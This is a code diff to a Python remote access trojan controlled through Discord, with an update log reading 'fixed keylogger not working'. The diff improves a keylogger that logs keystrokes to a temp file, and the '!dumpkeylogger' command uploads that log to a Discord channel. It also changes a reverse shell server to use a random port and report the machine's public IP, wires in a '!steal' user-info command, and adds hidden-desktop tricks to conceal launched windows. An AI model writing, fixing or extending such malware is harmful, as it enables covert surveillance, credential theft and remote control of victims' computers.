@@ -1,3 +1,4 @@
+# LATEST UPDATE LOGS : Fixed keylogger not working, fixed some bugs, added a few more imports that might be used later on.
 import winreg
 import ctypes
 import sys
@@ -20,6 +21,17 @@ from discord.ext import commands
 from ctypes import cast, POINTER, Structure, c_uint, c_int, sizeof, byref, windll
 from discord import utils
 import requests
+import platform
+import psutil
+import shutil
+import base64
+import re
+import cv2
+import pyperclip
+from PIL import ImageGrab
+from datetime import datetime
+from cryptography.fernet import Fernet
+from win32com.client import Dispatch
 
 # Import modules that might be missing and handle their absence
 try:
@@ -91,16 +103,17 @@ Availaible commands are :
 async def send_help_to_channel(channel):
     await channel.send(HELP_MENU)
 
-# Global variables
+
 stop_threads = False
-user_id = None
+user_id = None 
 channel_name = None
 _thread = None
 keylogger_running = False
-keylogger_thread = None
-link = None  # Initialize link variable
-pid_process = None  # Initialize pid_process variable
-
+keylogger_task = None
+link = None  
+pid_process = None 
+loop = asyncio.new_event_loop()  
+asyncio.set_event_loop(loop)  
 
 def steal_user_info():
     """
@@ -128,13 +141,16 @@ def steal_user_info():
 
 
 
-def start_reverse_shell(port=4444):
-    """Start a reverse shell server on the specified port."""
+def start_reverse_shell(port=0):  # Changed to port=0 to let OS assign random port
+    """Start a reverse shell server on a random available port."""
     try:
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        server.bind(('0.0.0.0', port))
+        server.bind(('0.0.0.0', port))  # OS will assign random available port
         server.listen(5)
+        
+        # Get the actual port that was assigned
+        _, port = server.getsockname()
         
         try:
             ip = requests.get('https://api.ipify.org/?format=text', timeout=3).text.strip()
@@ -186,10 +202,8 @@ def handle_client(client_socket, _):
     for target_func in [socket_to_shell, shell_to_socket]:
         thread = threading.Thread(target=target_func, daemon=True)
         thread.start()
-
 async def activity(client_instance):
     """Track user window activity and update Discord presence."""
-    import time
     try:
         import win32gui
         while True:
@@ -202,7 +216,7 @@ async def activity(client_instance):
                 await client_instance.change_presence(status=discord.Status.online, activity=game)
             except:
                 pass
-            time.sleep(1)
+            await asyncio.sleep(1)
     except ImportError:
         await client_instance.change_presence(status=discord.Status.online, activity=discord.Game("win32gui not available"))
 
@@ -304,7 +318,6 @@ def volumedown():
         volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
     except:
         pass
-
 # Keylogger functionality
 def start_keylogger():
     """Start the keylogger."""
@@ -324,7 +337,7 @@ def start_keylogger():
                 return False
                 
             try:
-                with open(log_file, "a") as f:
+                with open(log_file, "a", encoding="utf-8") as f:
                     try:
                         f.write(key.char)
                     except AttributeError:
@@ -332,8 +345,12 @@ def start_keylogger():
                             f.write(" ")
                         elif key == keyboard.Key.enter:
                             f.write("\n")
+                        elif key == keyboard.Key.backspace:
+                            f.write("[BKSP]")
+                        elif key == keyboard.Key.tab:
+                            f.write("[TAB]")
                         else:
-                            f.write(f"[{str(key)}]")
+                            f.write(f"[{str(key).upper()}]")
             except:
                 pass
         
@@ -341,6 +358,10 @@ def start_keylogger():
             with keyboard.Listener(on_press=on_press) as listener:
                 listener.join()
         
+        # Create empty log file
+        with open(log_file, "w", encoding="utf-8") as f:
+            f.write("=== Keylogger Started ===\n")
+            
         keylogger_running = True
         keylogger_thread = threading.Thread(target=keylogger_function, daemon=True)
         keylogger_thread.start()
@@ -356,6 +377,16 @@ def stop_keylogger():
     global keylogger_running
     if keylogger_running:
         keylogger_running = False
+        temp = os.getenv("TEMP")
+        log_file = os.path.join(temp, "klg.tmp")
+        dump_file = os.path.join(temp, "key_log.txt")
+        try:
+            # Copy contents to dump file
+            shutil.copy2(log_file, dump_file)
+            # Clear the temp log file
+            open(log_file, 'w').close()
+        except:
+            pass
         return "Keylogger stopped"
     else:
         return "Keylogger is not running"
@@ -372,7 +403,6 @@ async def on_message(message):
     # Ignore messages from the bot itself
     if message.author == client.user:
         return
-    
     if message.content == "!steal":
         try:
             result = steal_user_info()
@@ -440,11 +470,10 @@ async def on_message(message):
             await message.channel.send(f"[*] {result}")
         except Exception as e:
             await message.channel.send(f"[!] Error stopping keylogger: {str(e)}")
-
     elif message.content == "!dumpkeylogger":
         try:
             temp = os.getenv("TEMP")
-            file_keys = os.path.join(temp, "key_log.txt")
+            file_keys = os.path.join(temp, "klg.tmp")
             if os.path.exists(file_keys):
                 file = discord.File(file_keys, filename="keylog.txt")
                 await message.channel.send("[*] Command successfully executed", file=file)
@@ -873,25 +902,38 @@ async def on_message(message):
                 
                 subprocess.Popen(f'start {link}', shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
+                # Create a new virtual desktop
+                desktop = win32gui.CreateDesktop("hidden_desktop")
                 
-                def hide_youtube_window():
+                def run_on_hidden_desktop():
                     try:
+                        # Switch to hidden desktop
+                        desktop.SetThreadDesktop()
+                        
+                        # Start process on hidden desktop
+                        si = win32process.STARTUPINFO()
+                        si.lpDesktop = "hidden_desktop"
+                        subprocess.Popen(f'start {link}', shell=True, startupinfo=si)
+                        
+                        time.sleep(1)
+                        
+                        # Hide any visible windows
                         def enum_windows_callback(hwnd, _):
                             if win32gui.IsWindowVisible(hwnd):
                                 title = win32gui.GetWindowText(hwnd).lower()
                                 if "youtube" in title:
                                     win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
-                                    return True
                             return True
+                            
+                        win32gui.EnumWindows(enum_windows_callback, None)
                         
-                        for _ in range(20):
-                            win32gui.EnumWindows(enum_windows_callback, None)
-                            time.sleep(0.5)
                     except Exception:
                         pass
+                    finally:
+                        desktop.CloseDesktop()
                 
-                hide_thread = threading.Thread(target=hide_youtube_window)
-                hide_thread.daemon = True
+                hide_thread = threading.Thread(target=run_on_hidden_desktop)
+                hide_thread.daemon = True 
                 hide_thread.start()
                 
                 await message.channel.send("[*] Media playback started")
